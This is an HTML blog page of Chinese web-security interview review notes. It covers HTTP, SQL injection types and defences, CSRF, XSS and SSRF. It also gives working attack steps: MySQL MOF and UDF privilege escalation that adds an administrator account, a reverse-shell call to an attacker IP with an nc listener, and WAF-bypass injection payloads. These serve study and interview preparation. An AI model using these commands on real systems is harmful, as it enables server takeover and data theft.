@@ -1,0 +1,638 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WEB安全面试复习笔记 - co0ontty</title>
+    <meta name="author"  content="co0ontty">
+    <meta name="description" content="WEB安全面试复习笔记">
+    <meta name="keywords"  content="WEB, ALL">
+    <!-- Open Graph -->
+    <meta property="og:title" content="WEB安全面试复习笔记 - co0ontty">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="http://localhost:4000/2019/05/07/resttudy.html">
+    <meta property="og:description" content="Walking to Dalao。">
+    <meta property="og:site_name" content="co0ontty">
+    <link rel="stylesheet" href="//cdn.staticfile.org/normalize/6.0.0/normalize.min.css">
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_roc50gemkxpw4s4i.css">
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/prism.css">
+    <link rel="stylesheet" href="/assets/css/share.min.css">
+    <link rel="stylesheet" href="/assets/css/app.min.css">
+    <link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css">
+    <script src="https://cdn.staticfile.org/jquery/3.2.1/jquery.min.js"></script>
+	
+	<!--
+Author: Ray-Eldath
+refer to:
+ - http://docs.mathjax.org/en/latest/options/index.html
+-->
+
+	<script type="text/javascript" async src="https://cdn.bootcss.com/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+	
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+		jax: ["input/TeX", "output/HTML-CSS"],
+		tex2jax: {
+			inlineMath: [ ["$", "$"] ],
+			displayMath: [ ["$$", "$$"] ],
+			skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+		},
+		"HTML-CSS": { preferredFont: "TeX", availableFonts: ["STIX","TeX"] }
+      });
+    </script>
+
+	
+    <!--
+Author: Ray-Eldath
+-->
+<style>
+    .markdown-body .anchor{
+        float: left;
+        margin-top: -8px;
+        margin-left: -20px;
+        padding-right: 4px;
+        line-height: 1;
+        opacity: 0;
+    }
+    
+    .markdown-body .anchor .anchor-icon{
+        font-size: 15px
+    }
+</style>
+<script>
+    $(document).ready(function() {
+        let nodes = document.querySelector(".markdown-body").querySelectorAll("h1,h2,h3")
+        for(let node of nodes) {
+            var anchor = document.createElement("a")
+            var anchorIcon = document.createElement("i")
+            anchorIcon.setAttribute("class", "fa fa-anchor fa-lg anchor-icon")
+            anchorIcon.setAttribute("aria-hidden", true)
+            anchor.setAttribute("class", "anchor")
+            anchor.setAttribute("href", "#" + node.getAttribute("id"))
+            
+            anchor.onmouseover = function() {
+                this.style.opacity = "0.4"
+            }
+            
+            anchor.onmouseout = function() {
+                this.style.opacity = "0"
+            }
+            
+            anchor.appendChild(anchorIcon)
+            node.appendChild(anchor)
+        }
+    })
+</script>
+</head>
+
+
+<body>
+  <!--[if lt IE 10]>
+<div class="alert-danger" role="alert">你的浏览器实在太太太旧了，放学别走，升级完浏览器再说！<a target="_blank" class="alert-link" href="http://browsehappy.com">立即升级</a></div>
+<![endif]-->
+  <input id="nm-switch" type="hidden" value="true"> <header class="g-header">
+    <div class="g-logo">
+      <a href="/"></a>
+    </div>
+    <i id="menu-toggle" class="iconfont icon-menu"></i>
+    <nav class="g-nav">
+        <ul>
+            
+            <li><a href="/">首页</a></li>
+            
+            <li><a href="/tags.html">标签</a></li>
+            
+            <li><a href="/links.html">友链</a></li>
+            
+            <li><a href="/about.html">关于我</a></li>
+            
+        </ul>
+    </nav>
+</header>
+
+
+  <header
+    class="g-banner post-header post-pattern-circuitBoard bgcolor-default post-no-cover"
+    data-theme="default"
+  >
+    <div class="post-wrapper">
+      <div class="post-tags">
+        
+          
+            <a href="http://localhost:4000/tags#WEB" class="post-tag">WEB</a>
+          
+            <a href="http://localhost:4000/tags#ALL" class="post-tag">ALL</a>
+          
+        
+      </div>
+      <h1>WEB安全面试复习笔记</h1>
+      <div class="post-meta">
+        <span class="post-meta-item"><i class="iconfont icon-author"></i>co0ontty</span>
+        <time class="post-meta-item" datetime="19-05-07"><i class="iconfont icon-date"></i>07 May 2019</time>
+      </div>
+    </div>
+    
+  </header>
+
+  <div class="post-content visible">
+    
+
+    <article class="markdown-body">
+      <h2 id="对web安全的理解">对Web安全的理解</h2>
+<p>我觉得 Web 安全首先得懂 Web、第三方内容、Web 前端框架、Web 服务器语言、Web 开发框架、Web 应用、Web容器、存储、操作系统等这些都要了解，然后较为常见且危害较大的，SQL 注入，XSS 跨站、CSRF 跨站请求伪造等漏洞要熟练掌握。<br />
+第三方内容: 广告统计、mockup 实体模型</p>
+<blockquote>
+  <p>Web前端框架: jQuery 库、BootStrap<br />
+Web服务端语言: aps.net、php<br />
+Web开发框架: Diango/Rails/Thinkphp<br />
+Web应用: BBS ( discuz、xiuno ) / CMS ( 帝国、织梦、动易、Joomla ) / BLOG ( WordPress、Z-Blog、emlog )<br />
+Web 容器: Apache ( php )、IIS ( asp )、Tomcat ( java ) – 处理从客户端发出的请求<br />
+存储：数据库存储 / 内存存储 / 文件存储<br />
+操作系统: linux / Windows</p>
+</blockquote>
+
+<h2 id="http">HTTP</h2>
+<h3 id="http常见状态码">HTTP常见状态码</h3>
+<blockquote>
+  <p>1xx：信息提示，表示请求已被成功接收，继续处理。<br />
+2xx：成功，服务器成功处理了请求<br />
+3xx：重定向，告知客户端所请求的资源已经移动<br />
+4xx：客户端错误状态码，请求了一些服务器无法处理的东西。<br />
+5xx：服务端错误，描述服务器内部错误</p>
+</blockquote>
+
+<h3 id="http请求">HTTP请求</h3>
+<blockquote>
+  <p>请求行 ( 请求方法 )、请求头 ( 消息报头 ) 和请求正文</p>
+</blockquote>
+
+<h3 id="http响应">HTTP响应</h3>
+<blockquote>
+  <p>响应行，响应头 ( 消息报头 ) 和响应正文 ( 消息主题 )</p>
+</blockquote>
+
+<h3 id="get-和-post">GET 和 POST：</h3>
+<blockquote>
+  <p>GET方法用于获取请求页面的指定信息，如点击链接
+POST方法是有请求内容的，由于向服务器发送大量数据，如提交表单</p>
+</blockquote>
+
+<h2 id="数据库">数据库</h2>
+<p>基本的SQL语句：</p>
+<blockquote>
+  <p>增：INSERT INTO table_name (列1, 列2,…) VALUES (值1, 值2,….)<br />
+删：DELETE FROM 表名称 WHERE 列名称 = 值<br />
+改：UPDATE 表名称 SET 列名称 = 新值 WHERE 列名称 = 某值<br />
+查：SELECT 列名称 FROM 表名称</p>
+</blockquote>
+
+<p>mysql默认自带表:</p>
+<blockquote>
+  <p>information_schema、performance_schema、sys、mysql</p>
+</blockquote>
+
+<p>information_schema 数据库：
+ mysql 自带的，它提供了访问元数据库的方式。<br />
+sys 数据库 ：
+目标是把performance_schema的把复杂度降低</p>
+<blockquote>
+  <p>sys_config用于sys schema库的配置</p>
+</blockquote>
+
+<p>sys中的两种表：</p>
+<blockquote>
+  <p>1.字母开头： 适合人阅读，显示是格式化的数
+2.x$开头 ： 适合工具采集数据，原始类数据</p>
+</blockquote>
+
+<p>mysql 提权方式：<br />
+<strong><em>mof提权</em></strong> <br />
+拿到 Webshell 后： <br />
+1、找一个可写目录上传mof文件，例如上传到 C:/Windows/nullevt.mof<br />
+2、执行load_file及into dumpfile把文件导出到正确的位置即可:</p>
+<blockquote>
+  <p>Select load_file(‘C:/Windows/nullevt.mof’) into dumpfile ‘c:/windows/system32/wbem/mof/nullevt.mof’</p>
+</blockquote>
+
+<p>执行成功后，即可添加一个普通用户，然后你可以更改命令，再上传导出执行把用户提升到管理员权限，然后3389连接即可
+<strong><em>反弹端口提权</em></strong> <br />
+1、拿到 mysql root 权限，无法通过网站 Getshell，利用 mysql 客户端工具连接 mysql 服务器，然后执行下面的操作：</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">select</span> <span class="nx">backshell</span> <span class="p">(</span><span class="s2">"yourip"</span><span class="p">,</span><span class="mi">2010</span><span class="p">)</span>
+</code></pre></div></div>
+<p>2、本地监听你反弹的端口</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-vv</span> <span class="nt">-l</span> <span class="nt">-p</span> 2010     
+</code></pre></div></div>
+<p>成功后，你将获得一个 system 权限的 cmdshell</p>
+
+<p><strong><em>Mysql udf 提权</em></strong></p>
+
+<p>目录位置:</p>
+
+<p>c:\windows\system32</p>
+
+<p>1、最常见的是直接使用 udf.php (https://download.csdn.net/download/fly_hps/10752511 ) 此类的工具来执行 udf 提权</p>
+
+<p>具体如下:</p>
+
+<p>连接到 mysql 以后，先导出 udf.dll 到 c:\windows\system32 目录下。</p>
+
+<p>2、创建相应的函数并执行命令，具体如下：</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">create</span> <span class="k">function</span> <span class="nf">cmdshell</span> <span class="nx">returns</span> <span class="nx">string</span> <span class="nx">soname</span> <span class="s1">'udf.dll'</span><span class="p">;</span>
+<span class="nx">select</span> <span class="nx">cmdshell</span> <span class="p">(</span><span class="s1">'net user wintry wintry /add'</span><span class="p">);</span>
+<span class="nx">select</span> <span class="nx">cmdshell</span> <span class="p">(</span><span class="s1">'net localgroup administrators wintry /add'</span><span class="p">);</span>
+<span class="nx">drop</span> <span class="k">function</span> <span class="nf">cmdshell</span><span class="p">;</span>
+<span class="nb">delete</span> <span class="nx">from</span> <span class="nx">mysql</span><span class="o">.</span><span class="nx">func</span> <span class="nx">where</span> <span class="nx">name</span> <span class="o">=</span><span class="s1">'cmdshell'</span><span class="p">;</span>
+</code></pre></div></div>
+<h3 id="sql注入总结">sql注入总结</h3>
+<p>####总体见解：
+1.只要是支持批处理SQL指令的数据库服务器，都有可能受到此种手法的攻击。<br />
+2.注入的本质，是把用户输入数据作为代码执行。有两个关键条件：第一个是用户能控制输入；第二是原本程序要执行的代码，拼接了用户输入的数据，把数据当代码执行了。（出自吴瀚清《白帽子讲WEB安全》）<br />
+3.错误的回显是敏感信息，是攻击者了解某网站web服务器的重要手段。<br />
+4.最常见的盲注验证方法是，构造简单的条件语句，根据返回页面是否发生变化，判断SQL语句是否得到执行。例如http://a.b.c/item.php?id=2中，执行的SQL为：select title,body FROM item where ID =2可以 将域名改为http://a.b.c/item.php?id=2or 1=1，通过注入数据，再对返回页面进行差异结果比较。两次结果不一样，证明存在注入漏洞。<br />
+####SQL注入原理：<br />
+SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。（从客户端提交特殊的代码，从而收集程序及服务器的信息，从而获取你想到得到的资料）</p>
+<h3 id="sql注入漏洞常见类型">SQL注入漏洞常见类型：</h3>
+<p>1.没有正确过滤转义字符 <br />
+2.Incorrecttypehandling <br />
+3.数据库服务器中的漏洞 <br />
+4.盲目SQL注入式攻击<br />
+5.条件响应<br />
+6.条件性差错<br />
+7.时间延误</p>
+<h3 id="sql注入点的类型">SQL注入点的类型：</h3>
+<p>1，数字型注入点<br />
+2，字符型注入点<br />
+3，搜索型注入点：<br />
+这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有“keyword=关键字”，有的不显示的链接地址，而是直接通过搜索框表单提交。<br />
+SQL注入原因：<br />
+①不当的类型处理；<br />
+②不安全的数据库配置；<br />
+③不合理的查询集处理；<br />
+④不当的错误处理；<br />
+⑤转义字符处理不合适；<br />
+⑥多个提交处理不当。</p>
+<h3 id="sql注入一般步骤">SQL注入一般步骤：</h3>
+<p>发现SQL注入位置；<br />
+·判断环境，寻找注入点，判断数据库类型；  <br />
+其次，根据注入参数类型，在脑海中重构SQL语句的原貌，按参数类型主要分为下面三种： <br />
+(A) ID=49这类注入的参数是数字型， <br />
+SQL语句原貌大致如下：Select * from表名where字段=49注入的参数为ID=49 And [查询条件]，即是生成语句：Select * from表名where字段=49 And [查询条件] <br />
+(B) Class=连续剧这类注入的参数是字符型， <br />
+SQL语句原貌大致概如下：Select * from表名where字段=’连续剧’注入的参数为Class=连续剧’ and [查询条件]and‘’=’，即是生成语句：Select * from表名where字段=’连续剧’ and [查询条件] and‘’=’’ <br />
+(C)搜索时没过滤参数的， <br />
+如keyword=关键字，SQL语句原貌大致如下：Select * from表名where字段like ’%关键字%’注入的参数为keyword=’ and [查询条件] and ‘%25’=’，即是生成语句：Select * from表名where字段like ’%’ and [查询条件]and‘%’=’%’·发现WEB虚拟目录，将查询条件替换成SQL语句，猜解表名，猜列名，猜目标目录的字段长度。</p>
+<h3 id="数据库攻击常用技巧">数据库攻击常用技巧：</h3>
+<p>猜表名，确认表名，列名<br />
+·上传ASP木马，留下后门；<br />
+·得到管理员权限，窃取数据；<br />
+ASP木马只有USER权限，要想获取对系统的完全控制，还要有系统的管理员权限。怎么办？<br />
+提升权限的方法有很多种：<br />
+上传木马，修改开机自动运行的.ini文件（它一重启，便死定了）；<br />
+复制CMD.exe到scripts，人为制造UNICODE漏洞；下载SAM文件，破解并获取OS的所有用户名密码；   等等，视系统的具体情况而定，可以采取不同的方法。</p>
+<h3 id="如何判断sqli注入有哪些方法">如何判断sqli注入，有哪些方法？</h3>
+<p>添加单引号，双引号，order by, sleep，benchmark，运算符，修改数据类型，报错注入语句测试</p>
+<h3 id="mysql的用户名密码是放在哪张表里面">mysql的用户名密码是放在哪张表里面？</h3>
+<p>mysql数据库下的user表。</p>
+
+<h3 id="sql注入过滤绕过总结">sql注入过滤绕过总结</h3>
+<h4 id="注释符号绕过">注释符号绕过：</h4>
+<p>常用的注释符有</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">--</span> <span class="nx">注释内容</span>
+<span class="c1"># 注释内容</span>
+<span class="cm">/*注释内容*/</span>
+</code></pre></div></div>
+<h4 id="大小写绕过">大小写绕过：</h4>
+<p>常用于waf的正则对大小写不敏感的情况，一般都是题目自己故意这样设计。<br />
+例如：waf过滤了关键字select，可以尝试使用Select等绕过。</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">mysql</span><span class="o">&gt;</span> <span class="nx">select</span> <span class="o">*</span> <span class="nx">from</span> <span class="nx">users</span> <span class="nx">where</span> <span class="nx">id</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span> <span class="nx">union</span> <span class="nx">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span>
+    <span class="o">-&gt;</span> <span class="p">;</span>
+<span class="o">+----+----------+----------+</span>
+<span class="o">|</span> <span class="nx">id</span> <span class="o">|</span> <span class="nx">username</span> <span class="o">|</span> <span class="nx">password</span> <span class="o">|</span>
+<span class="o">+----+----------+----------+</span>
+<span class="o">|</span>  <span class="mi">1</span> <span class="o">|</span> <span class="mi">2</span>        <span class="o">|</span> <span class="mi">3</span>        <span class="o">|</span>
+<span class="o">+----+----------+----------+</span>
+<span class="mi">1</span> <span class="nx">row</span> <span class="nx">in</span> <span class="nx">set</span> <span class="p">(</span><span class="mf">0.00</span> <span class="nx">sec</span><span class="p">)</span>
+
+<span class="c1">#大小写绕过</span>
+<span class="nx">mysql</span><span class="o">&gt;</span> <span class="nx">select</span> <span class="o">*</span> <span class="nx">from</span> <span class="nx">users</span> <span class="nx">where</span> <span class="nx">id</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span> <span class="nx">union</span> <span class="nx">Select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">;</span>
+<span class="o">+----+----------+----------+</span>
+<span class="o">|</span> <span class="nx">id</span> <span class="o">|</span> <span class="nx">username</span> <span class="o">|</span> <span class="nx">password</span> <span class="o">|</span>
+<span class="o">+----+----------+----------+</span>
+<span class="o">|</span>  <span class="mi">1</span> <span class="o">|</span> <span class="mi">2</span>        <span class="o">|</span> <span class="mi">3</span>        <span class="o">|</span>
+<span class="o">+----+----------+----------+</span>
+
+<span class="o">---------------------</span> 
+</code></pre></div></div>
+<h4 id="内联注释绕过">内联注释绕过:</h4>
+<p>内联注释就是把一些特有的仅在MYSQL上的语句放在 /<em>!…</em>/中，这样这些语句如果在其它数据库中是不会被执行，但在MYSQL中会执行。</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">mysql</span><span class="o">&gt;</span> <span class="nx">select</span> <span class="o">*</span> <span class="nx">from</span> <span class="nx">users</span> <span class="nx">where</span> <span class="nx">id</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span> <span class="nx">union</span> <span class="cm">/*!select*/</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">;</span>
+<span class="o">+----+----------+----------+</span>
+<span class="o">|</span> <span class="nx">id</span> <span class="o">|</span> <span class="nx">username</span> <span class="o">|</span> <span class="nx">password</span> <span class="o">|</span>
+<span class="o">+----+----------+----------+</span>
+<span class="o">|</span>  <span class="mi">1</span> <span class="o">|</span> <span class="mi">2</span>        <span class="o">|</span> <span class="mi">3</span>        <span class="o">|</span>
+<span class="o">+----+----------+----------+</span>
+<span class="o">---------------------</span> 
+</code></pre></div></div>
+<h4 id="双写关键字绕过">双写关键字绕过:</h4>
+<p>在某一些简单的waf中，将关键字select等只使用replace()函数置换为空，这时候可以使用双写关键字绕过。例如select变成seleselectct，在经过waf的处理之后又变成select，达到绕过的要求。</p>
+<h4 id="特殊编码绕过">特殊编码绕过:</h4>
+<p>十六进制绕过</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">mysql</span><span class="o">&gt;</span> <span class="nx">select</span> <span class="o">*</span> <span class="nx">from</span> <span class="nx">users</span> <span class="nx">where</span> <span class="nx">username</span> <span class="o">=</span> <span class="mh">0x7465737431</span><span class="p">;</span>
+<span class="o">+----+----------+----------+</span>
+<span class="o">|</span> <span class="nx">id</span> <span class="o">|</span> <span class="nx">username</span> <span class="o">|</span> <span class="nx">password</span> <span class="o">|</span>
+<span class="o">+----+----------+----------+</span>
+<span class="o">|</span>  <span class="mi">1</span> <span class="o">|</span> <span class="nx">test1</span>    <span class="o">|</span> <span class="nx">pass</span>     <span class="o">|</span>
+<span class="o">+----+----------+----------+</span>
+</code></pre></div></div>
+<p>ascii编码绕过<br />
+Test 等价于CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)<br />
+tip:好像新版mysql不能用了</p>
+<h4 id="空格过滤绕过">空格过滤绕过:</h4>
+<p>一般绕过空格过滤的方法有以下几种方法来取代空格</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/**/</span>
+<span class="p">()</span>
+<span class="nx">回车</span><span class="p">(</span><span class="nx">url编码中的</span><span class="o">%</span><span class="mi">0</span><span class="nx">a</span><span class="p">)</span>
+<span class="err">`</span><span class="p">(</span><span class="nx">tap键上面的按钮</span><span class="p">)</span>
+<span class="nx">tap</span>
+<span class="nx">两个空格</span>
+</code></pre></div></div>
+<p>实例:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">mysql</span><span class="o">&gt;</span> <span class="nx">select</span><span class="cm">/**/</span><span class="o">*/**/</span><span class="nx">from</span><span class="cm">/**/</span><span class="nx">users</span><span class="p">;</span> 
+
+<span class="nx">mysql</span><span class="o">&gt;</span> <span class="nx">select</span><span class="p">(</span><span class="nx">id</span><span class="p">)</span><span class="nx">from</span><span class="p">(</span><span class="nx">users</span><span class="p">);</span> <span class="c1">#注意括号中不能含有*  </span>
+
+<span class="nx">mysql</span><span class="o">&gt;</span> <span class="nx">select</span>
+    <span class="o">-&gt;</span> <span class="o">*</span>
+    <span class="o">-&gt;</span> <span class="na">from</span> 
+    <span class="o">-&gt;</span> <span class="na">users</span>
+    <span class="o">-&gt;</span> <span class="na">where</span> 
+    <span class="o">-&gt;</span> <span class="na">id</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+
+<span class="nx">mysql</span><span class="o">&gt;</span> <span class="nx">select</span><span class="sb">`id`</span><span class="nx">from</span><span class="sb">`users`</span><span class="nx">where</span><span class="sb">`id`</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span>  
+</code></pre></div></div>
+<h4 id="过滤or-and-xor-not-绕过">过滤or and xor not 绕过:</h4>
+<blockquote>
+  <p>and = &amp;&amp;<br />
+or = ||<br />
+xor = | # 异或<br />
+not = !</p>
+  <h4 id="过滤等号绕过">过滤等号=绕过</h4>
+  <p>#####不加通配符的like执行的效果和=一致，所以可以用来绕过。<br />
+正常加上通配符的like：</p>
+  <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">mysql</span><span class="o">&gt;</span> <span class="nx">select</span> <span class="o">*</span> <span class="nx">from</span> <span class="nx">users</span> <span class="nx">where</span> <span class="nx">username</span> <span class="nx">like</span> <span class="s2">"test%"</span><span class="p">;</span>
+</code></pre></div>  </div>
+  <p>#####使用大小于号来绕过：</p>
+  <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">mysql</span><span class="o">&gt;</span> <span class="nx">select</span> <span class="o">*</span> <span class="nx">from</span> <span class="nx">users</span> <span class="nx">where</span> <span class="nx">id</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="k">and</span> <span class="nx">id</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">;</span>
+</code></pre></div>  </div>
+  <h3 id="如何防御sql漏洞">如何防御SQL漏洞？</h3>
+  <p>核心原则：数据代码分离原则。 
+1.最佳方法：预编译语句，绑定变量。使用预编译的SQL语句，SQL的语意不会变化，攻击者无法改变SQL的结构，即使攻击者插入了类似于’or ‘1’=’1的字符串，也只会将此字符串作为username查询。 
+2.从存储过程来防御：先将SQL语句定义在数据库中，存储过程中可能也存在注入问题，应该尽量避免在存储过程中使用动态SQL语句。 
+3.从数据类型角度来防御：限制数据类型，并统一数据格式。 
+4.从开发者角度来防御：开发时尽量用安全函数代替不安全函数，编写安全代码。危险函数，常见的执行命令函数，动态访问函数，如C语言中的system(),PHP的eval()，JSP的include()导致的代码越权执行，都是注入。 
+5.从数据库管理者角度来防御：的最小权限原则，避免root,dbowner等高权限用户直接连接数据库。</p>
+  <h3 id="为什么有的时候没有错误回显用php举例">为什么有的时候没有错误回显，用php举例</h3>
+</blockquote>
+
+<p>php的配置文件php.ini进行了修改，display_errors = On 修改为 display_errors = off时候就没有报错提示。
+在php脚本开头添加error_reporting(0); 也可以达到关闭报错的作用。</p>
+
+<p>宽字符注入的原理？如何利用宽字符注入漏洞，payload如何构造？</p>
+
+<p>通俗讲，gbk，big5等编码占了两个字节，sql语句进后端后对单引号等进行了转义，转义\为%5C，当前面的%xx与%5C能结合成两个字节的字符时候，就可以使后面的单引号逃逸，从而造成注入。比较常见的gbk，%df’ =&gt;
+%df%5c%27 =&gt; 運’ 。已经可以单引号了，剩下的就和普通注入差不多了。</p>
+
+<h3 id="sql的bypass技巧">sql的bypass技巧</h3>
+
+<p>这种太多了，网上一搜一大把。主要还是看目标站点的过滤和防护，常见bypass可以是</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/**/</span> <span class="nx">替换空格</span><span class="err">，</span>  
+<span class="cm">/*!00000union*/</span> <span class="nx">等于union</span><span class="err">，</span>  
+<span class="nx">或者利用前端过滤</span><span class="err">，</span><span class="nx">添加尖括号</span><span class="s1">'&lt;  &gt;'</span><span class="err">。</span>
+<span class="nx">大小写什么的都太常见了</span><span class="err">，</span><span class="nx">如果过滤了函数或者关键字</span><span class="err">，</span><span class="nx">可以尝试其他能达到效果的同等函数</span><span class="err">，</span><span class="nx">关键字比如or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="nx">可以用</span><span class="o">||</span><span class="mi">1</span><span class="nx">替换</span><span class="err">，</span><span class="nx">或者用运算符比如</span><span class="o">/</span><span class="err">，</span><span class="o">%</span><span class="nx">达到相同的效果</span><span class="err">。</span><span class="nx">总之</span><span class="err">，</span><span class="nx">还是看要求</span><span class="err">。</span>
+</code></pre></div></div>
+<h2 id="crlf注入的原理">CRLF注入的原理</h2>
+
+<p>CRLF是回车+换行的简称。碰得比较少，基本没挖到过这种洞，简而言之一般是可以通过提交恶意数据里面包含回车，换行来达到控制服务器响应头的效果。碰到过潜在的CRLF都是提交回车和换行之后就500了。CRLF的利用可以是XSS，恶意重定向location，还有set-cookie.</p>
+
+<h2 id="xss发生的场景">XSS发生的场景</h2>
+
+<p>个人理解是对用户提交数据为进行安全的过滤然后直接输入到页面当中，造成js代码的执行。至于具体场景，有输出的地方就有可能被xss的风险。</p>
+
+<h2 id="如果给你一个xss盲打漏洞但是返回来的信息显示他的后台在内网并且只能内网访问如何利用这个xss">如果给你一个XSS盲打漏洞，但是返回来的信息显示，他的后台在内网，并且只能内网访问，如何利用这个xss？</h2>
+
+<p>github有一些现成的xss扫描内网端口的脚本，可以参考利用，再根据探测出来的信息进一步利用，比如开了redis等，再就是利用漏洞去getshell.</p>
+
+<h2 id="phpini可以设置哪些安全特性">php.ini可以设置哪些安全特性？</h2>
+<p>关闭报错，设置open_basedir，禁用危险函数，打开gpc。有具体的文章介绍安全配置这一块，属于运维的工作范围。</p>
+<h2 id="php的00截断的原理">php的%00截断的原理？</h2>
+<p>存在于5.3.4版本下，一般利用在文件上传时文件名的截断，或者在对文件进行操作时候都有可能存在00阶段的情况。 如filename=test.php%00.txt 会被截断成test.php，00后面的被忽略。系统在对文件名读取时候，如果遇到0x00,就会认为读取已经结束了。</p>
+<h2 id="webshell的检测有哪些方法">webshell的检测，有哪些方法？</h2>
+<p>个人知道的大体上分为静态检测和动态检测两种。静态检测比如查找危险函数，如eval，system等。动态检测是检测脚本运行时要执行的动作，比如文件操作，socket操作等。具体方法可以是通过D盾或者其他查杀软件进行查杀，现在也有基于机器学习的webshell识别。</p>
+<h2 id="csrf漏洞的本质是什么">CSRF漏洞的本质是什么？</h2>
+<p>CSRF即跨站请求伪造，以受害者的身份向服务器发送一个请求。本质上个人觉得是服务端在执行一些敏感操作时候对提交操作的用户的身份校检不到位。</p>
+<h3 id="防御csrf都有哪些方法java是如何防御csrf漏洞的token一定有用吗">防御CSRF都有哪些方法，JAVA是如何防御CSRF漏洞的，token一定有用吗？</h3>
+<p>防御CSRF一般是加上referer和csrf_token.
+jAVA不太懂。具体可以参考这篇CSRF攻击的CSRF攻击的应对之道</p>
+<h2 id="ssrf漏洞判断的方法">ssrf漏洞判断的方法：</h2>
+<h3 id="介绍">介绍：</h3>
+<p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
+<h3 id="形成的原因">形成的原因：</h3>
+<p>由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p>
+
+    </article>
+
+    
+    <div class="social-share-wrapper">
+      <div class="social-share"></div>
+    </div>
+    
+  </div>
+
+  <section class="author-detail">
+    <section class="post-footer-item author-card">
+      <div class="avatar">
+        <img src="http://localhost:4000/assets/img/profile.png" alt="">
+      </div>
+      <div class="author-name" rel="author">co0ontty</div>
+      <div class="bio">
+        <p>知道创宇实习生</p>
+      </div>
+      
+      <ul class="sns-links">
+        
+        <li>
+          <a href="//weibo.com/5792988237" target="_blank">
+                    <i class="iconfont icon-weibo"></i>
+                </a>
+        </li>
+        
+        <li>
+          <a href="mailto:co0ontty@gmail.com" target="_blank">
+                    <i class="iconfont icon-email"></i>
+                </a>
+        </li>
+        
+        <li>
+          <a href="//facebook.com/co0ontty" target="_blank">
+                    <i class="iconfont icon-facebook"></i>
+                </a>
+        </li>
+        
+        <li>
+          <a href="//github.com/co0ontty" target="_blank">
+                    <i class="iconfont icon-github"></i>
+                </a>
+        </li>
+        
+      </ul>
+      
+    </section>
+    <section class="post-footer-item read-next">
+      
+      <div class="read-next-item">
+        <a href="/2019/05/08/Interviewsummary.html" class="read-next-link"></a>
+        <section>
+          <span>360企业安全观星实验室渗透测试（web）面试总结</span>
+          <p>简历：投递简历的时候详细描述了参加过的比赛及在校期间参加的一些项目情况，顺利的通过了简历的筛选。一面（技术面试）：...</p>
+        </section>
+        
+     </div>
+      
+
+      
+      <div class="read-next-item">
+        <a href="/2019/04/13/batterupload.html" class="read-next-link"></a>
+          <section>
+            <span>结合CTF详解条件竞争漏洞</span>
+            <p>什么是条件竞争漏洞？条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并...</p>
+          </section>
+          
+          <div class="filter"></div>
+          <img src="https://i.loli.net/2019/04/12/5cb07b9862aee.jpg" alt="">
+          
+      </div>
+      
+    </section>
+    
+  </section>
+<div id="lv-container" data-id="city" data-uid="MTAyMC80MTI3My8xNzgyMQ==">
+<script type="text/javascript">
+   (function(d, s) {
+       var j, e = d.getElementsByTagName(s)[0];
+
+       if (typeof LivereTower === 'function') { return; }
+
+       j = d.createElement(s);
+       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+       j.async = true;
+
+       e.parentNode.insertBefore(j, e);
+   })(document, 'script');
+</script>
+<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+</div>
+  <footer class="g-footer">
+  <!-- <section><a href="javascript:scroll(50,50)">回到顶端</a></section> -->
+<!-- 网站计数器 -->
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
